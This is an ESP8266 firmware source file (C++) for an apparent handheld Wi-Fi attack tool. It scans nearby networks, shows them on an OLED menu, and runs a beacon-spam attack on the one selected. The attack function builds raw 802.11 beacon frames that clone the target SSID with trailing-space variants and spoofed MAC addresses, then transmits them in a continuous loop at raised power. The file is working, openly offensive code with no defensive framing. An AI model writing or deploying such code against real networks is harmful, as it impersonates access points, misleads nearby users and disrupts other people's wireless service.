#include "beaconSpam.h"
#include "inputnodes.h"

extern "C" {
  #include <user_interface.h>
}

extern bool isInAttackMode;

// --- Static Member Initialization ---
Adafruit_SSD1306* beaconSpam::displayVar = nullptr;
int beaconSpam::_networksFound = 0;
int beaconSpam::_currentSelected = 0;
int beaconSpam::_TopStart = 0;

static uint8_t beacon_frame[100] = {
  0x80, 0x00, 0x00, 0x00, 
  0xff, 0xff, 0xff, 0xff, 0xff, 0xff,   
  0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc,   
  0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc,   
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
  0x64, 0x00, 0x01, 0x04, 0x00, 0x00 
};

beaconSpam::beaconSpam(Adafruit_SSD1306* displayHandle) {
  displayVar = displayHandle;
}

void beaconSpam::initDevice() {
  WiFi.mode(WIFI_STA);
  WiFi.disconnect();
  WiFi.setPhyMode(WIFI_PHY_MODE_11N);
  system_phy_set_max_tpw(40); 
  delay(100);

  buttonUp.attachClick(beaconSpam::handleNavigateUp);
  buttonDown.attachClick(beaconSpam::handleNavigateDown);
  buttonSelect.attachClick(beaconSpam::handleSelection); 
}

void beaconSpam::handleNavigateUp() {
  if (_currentSelected > 0) {
    _currentSelected--;
    if (_currentSelected < _TopStart) _TopStart--;
    renderInterface(); // Works now because renderInterface is static
  }
}

void beaconSpam::handleNavigateDown() {
  if (_currentSelected < _networksFound - 1) {
    _currentSelected++;
    if (_currentSelected >= _TopStart + 3) _TopStart++;
    renderInterface();
  }
}

void beaconSpam::handleSelection() {
  if (_networksFound > 0) {
    String ssid = WiFi.SSID(_currentSelected);
    int ch = WiFi.channel(_currentSelected);
    
    displayVar->clearDisplay();
    displayVar->setCursor(0, 0);
    displayVar->println(F("ATTACK ACTIVE"));
    displayVar->println(F("Hold SELECT to stop"));
    displayVar->println(F("---------------------"));
    displayVar->println(ssid);
    displayVar->display();

    // Since this is static, we create a temp instance to run the attack
    beaconSpam temp(displayVar);
    temp.runBeaconAttack(ssid, ch);
  }
}

void beaconSpam::renderInterface() {
  if (displayVar == nullptr) return;
  displayVar->clearDisplay();
  displayVar->setTextSize(1);
  displayVar->setTextColor(SSD1306_WHITE);
  displayVar->setCursor(0, 0);
  
  if (_networksFound <= 0) {
    displayVar->println(F("No networks found."));
  } else {
    displayVar->print(F("Found: "));
    displayVar->println(_networksFound);
    displayVar->println(F("---------------------")); 

    for (int i = 0; i < 4; i++) {
      int idx = _TopStart + i;
      if (idx >= _networksFound) break;
      displayVar->print(idx == _currentSelected ? "> " : "  ");
      displayVar->print(idx + 1);
      displayVar->print(F(". "));
      displayVar->println(WiFi.SSID(idx));
    }
  }
  displayVar->display();
}

void beaconSpam::runBeaconAttack(String targetSSID, int channel) {
  uint8_t current_mac[6];
  wifi_get_macaddr(STATION_IF, current_mac); 
  wifi_set_channel(channel);

  // Set Beacon Interval to 102.4ms (0x64 0x00)
  // This tells devices how often to expect this frame
  beacon_frame[32] = 0x64; 
  beacon_frame[33] = 0x00;

  while (isInAttackMode) {
    // Generate 10 variations of the SSID using trailing spaces
    for (int i = 0; i < 10; i++) {
      if (!isInAttackMode) return; 

      // 1. Create SSID with 'i' number of trailing spaces
      String currentSSID = targetSSID;
      for (int s = 0; s < i; s++) {
        currentSSID += ' ';
      }
      
      // Ensure we don't exceed the 32-byte limit for SSIDs
      if (currentSSID.length() > 32) {
        currentSSID = currentSSID.substring(0, 32);
      }

      char ssid_cstr[33];
      currentSSID.toCharArray(ssid_cstr, 33);
      size_t ssid_len = strlen(ssid_cstr);
      
      // 2. Prepare Spoofed MAC (BSSID)
      // We increment the last byte so devices treat them as unique hardware
      uint8_t spoofed_mac[6];
      memcpy(spoofed_mac, current_mac, 6);
      spoofed_mac[5] += i; 

      // 3. Construct Frame Header
      // Source Address (Transmitter) and BSSID
      memcpy(&beacon_frame[10], spoofed_mac, 6); 
      memcpy(&beacon_frame[16], spoofed_mac, 6); 

      // 4. Construct Information Elements (IEs)
      int frameid = 36; // Start of tagged parameters

      // SSID Tag
      beacon_frame[frameid++] = 0x00; 
      beacon_frame[frameid++] = (uint8_t)ssid_len;
      memcpy(&beacon_frame[frameid], ssid_cstr, ssid_len);
      frameid += ssid_len;

      // Supported Rates Tag
      uint8_t rates[] = { 0x01, 0x08, 0x82, 0x84, 0x8b, 0x96, 0x12, 0x24, 0x48, 0x6c };
      memcpy(&beacon_frame[frameid], rates, 10);
      frameid += 10;

      // DS Parameter Set (Channel) Tag
      beacon_frame[frameid++] = 0x03;
      beacon_frame[frameid++] = 0x01;
      beacon_frame[frameid++] = (uint8_t)channel;

      // 5. Transmit
      // Send the raw packet via the ESP8266 SDK function
      wifi_send_pkt_freedom(beacon_frame, frameid, 0);
      
      // Micro-delay between clones to allow the radio buffer to clear
      delay(1); 
    }
    
    // 6. System Health
    // After sending all 10 beacons, we wait roughly the remainder of 
    // the beacon interval (100ms) and yield to the ESP8266 system tasks.
    delay(90); 
    yield(); 
  }
}

void beaconSpam::executeScan() {
  displayVar->clearDisplay();
  displayVar->setCursor(0, 0);
  displayVar->println(F("Scanning WiFi..."));
  displayVar->display();

  _networksFound = WiFi.scanNetworks();
  _currentSelected = 0;
  _TopStart = 0;
  renderInterface();
}